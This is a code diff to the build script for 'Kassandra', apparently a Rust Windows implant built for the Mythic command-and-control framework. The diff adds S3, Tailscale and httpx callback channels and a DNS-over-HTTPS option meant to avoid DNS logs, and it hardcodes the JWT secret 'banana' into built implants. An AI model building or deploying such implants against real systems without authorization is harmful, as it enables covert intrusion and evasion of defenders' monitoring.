@@ -22,17 +22,27 @@ from .pe_opsec import (
 class KassandraAgent(PayloadType):
     name = "Kassandra"
     file_extension = "exe"
-    author = "Tuco"
+    author = "@TucoTaco"
     supported_os = [SupportedOS.Windows]
     wrapper = False
     wrapped_payloads = []
-    note = """Windows implant in Rust with EDR evasion, indirect syscalls, and OPSEC-safe defaults"""
+    note = """Basic Implant in Rust"""
     supports_dynamic_loading = False
-    c2_profiles = ["http", "jwt_c2"]
+    c2_profiles = ["http", "httpx", "s3_storage", "tailscale", "jwt_c2"]
     # Donut shellcode format / AMSI bypass choices (same ordering as Apollo / donut -f / -b).
     shellcode_format_options = ["Binary", "Base64", "C", "Ruby", "Python", "Powershell", "C#", "Hex"]
     shellcode_bypass_options = ["None", "Abort on fail", "Continue on fail"]
-    c2_parameter_deviations = {}
+    c2_parameter_deviations = {
+        "s3_storage": {
+            "encrypted_exchange_check": C2ParameterDeviation(supported=False),
+        },
+        "tailscale": {
+            "encrypted_exchange_check": C2ParameterDeviation(supported=False),
+        },
+        "httpx": {
+            "encrypted_exchange_check": C2ParameterDeviation(supported=False),
+        }
+    }
     mythic_encrypts = False
     translation_container = "KassandraTranslator"
     build_parameters = [
@@ -80,6 +90,26 @@ class KassandraAgent(PayloadType):
             parameter_type=BuildParameterType.String,
             description="Chunk size in bytes for upload/download",
             default_value="4096"
+        ),
+        BuildParameter(
+            name="tailscale_protocol",
+            parameter_type=BuildParameterType.ChooseOne,
+            choices=["http", "tcp"],
+            default_value="http",
+            description="Agent-to-C2 transport inside the WireGuard tunnel: http (compatible) or tcp (lower overhead)",
+        ),
+        BuildParameter(
+            name="doh",
+            parameter_type=BuildParameterType.ChooseOne,
+            choices=["off", "cloudflare", "google", "custom"],
+            default_value="off",
+            description="DNS-over-HTTPS: resolve Tailscale hostnames via DoH to avoid DNS logs",
+        ),
+        BuildParameter(
+            name="doh_url",
+            parameter_type=BuildParameterType.String,
+            default_value="",
+            description="Custom DoH resolver URL (only used when doh=custom, e.g. https://dns.example.com/dns-query)",
         ),
         BuildParameter(
             name="no_console",
@@ -168,8 +198,8 @@ class KassandraAgent(PayloadType):
 
         ts_config = None
         use_tailscale = False
-
         use_jwt_bearer = False
+
         stdout_err = ""
         for c2 in self.c2info:
             profile = c2.get_c2profile()
@@ -236,25 +266,17 @@ class KassandraAgent(PayloadType):
 
                 ts_config = json.loads(config_data.Result) if isinstance(config_data.Result, str) else config_data.Result
 
-            elif profile_name == "jwt_c2":
-                use_jwt_bearer = True
-                params = c2.get_parameters_dict()
-                for key, val in params.items():
-                    if isinstance(val, dict) and 'enc_key' in val:
-                        stdout_err += "Setting {} to {}".format(key, val["enc_key"] if val["enc_key"] is not None else "")
-                        encKey = base64.b64decode(val["enc_key"]) if val["enc_key"] is not None else ""
-                    elif key == "endpoint":
-                        Config["post_uri"] = val
-                    else:
-                        Config[key] = val
-
-            elif profile_name == "http":
+            elif profile_name in ("http", "jwt_c2"):
+                if profile_name == "jwt_c2":
+                    use_jwt_bearer = True
                 for key, val in c2.get_parameters_dict().items():
                     if isinstance(val, dict) and 'enc_key' in val:
                         stdout_err += "Setting {} to {}".format(key, val["enc_key"] if val["enc_key"] is not None else "")
                         encKey = base64.b64decode(val["enc_key"]) if val["enc_key"] is not None else ""
                     else:
                         Config[key] = val
+                if profile_name == "jwt_c2" and "endpoint" in Config:
+                    Config["post_uri"] = Config["endpoint"]
             break
 
         if not use_s3:
@@ -333,7 +355,6 @@ class KassandraAgent(PayloadType):
             content = content.replace("%CALLBACK_JITTER%", str(int(Config.get("callback_jitter", 10))))
             content = content.replace("%SSL%", "true" if Config.get("ssl") else "false")
             content = content.replace("%PROXYENABLED%", "true" if Config.get("proxyEnabled") else "false")
-            content = content.replace("%USE_JWT_BEARER%", "true" if use_jwt_bearer else "false")
 
             max_dlls = self.get_parameter("max_loaded_dlls") if self.get_parameter("max_loaded_dlls") else "25"
             content = content.replace("%MAX_LOADED_DLLS%", str(int(max_dlls)))
@@ -379,6 +400,13 @@ class KassandraAgent(PayloadType):
                 content = content.replace("%S3_BOOTSTRAP_SECRET_ACCESS_KEY%", "")
                 content = content.replace("%S3_REGION%", "")
                 content = content.replace("%AESPSK%", "")
+
+            if use_jwt_bearer:
+                content = content.replace("%USE_JWT_BEARER%", "true")
+                content = content.replace("%JWT_SECRET%", "banana")
+            else:
+                content = content.replace("%USE_JWT_BEARER%", "false")
+                content = content.replace("%JWT_SECRET%", "")
 
             f.seek(0)
             f.write(content)
